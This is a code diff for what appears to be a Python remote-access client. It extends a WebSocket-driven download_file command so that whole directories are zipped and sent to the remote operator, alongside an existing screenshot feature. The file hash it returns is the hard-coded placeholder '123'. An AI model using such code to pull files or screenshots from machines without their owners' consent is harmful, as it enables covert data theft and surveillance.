@@ -6,6 +6,8 @@ from io import BytesIO
 import pyscreenshot as pySs
 import json
 import psutil
+import shutil
+from tempfile import gettempdir
 
 DEFAULT_BUFFER_SIZE = 8 * 1024
 
@@ -86,7 +88,13 @@ def download_file(args: list, wsConn: WebSocketApp, event: Event):
     if len(fileName) == 0 and args[1] == True:
         return screenshot(args, wsConn, event)
 
-    if os.path.exists(fileName) and os.path.isfile(fileName):
+    if os.path.exists(fileName):
+        isDir = os.path.isdir(fileName)
+        if isDir:
+            zipFileName = gettempdir() + "/" + os.path.basename(fileName)
+            shutil.make_archive(zipFileName, "zip", fileName)
+            fileName = zipFileName + ".zip"
+
         fileStat = os.stat(fileName)
         fileSize = fileStat.st_size
 
@@ -108,6 +116,13 @@ def download_file(args: list, wsConn: WebSocketApp, event: Event):
                     # wsConn.send(json.dumps({"cmd_response": "download_file", "file_hash":"123"}))
                     _send_cmd_response(wsConn, "download_file", "file_hash", "123")
                     print("file sent")
+                    
+                    # if it is a directory, remove the temporary .zip file created
+                    if isDir:
+                        try:
+                            os.remove(fileName)
+                        except:
+                            print(f"Failed to remove temporary file {fileName}")
     
     else:
         _send_cmd_response(wsConn, "download_file", "error", "Invalid file")
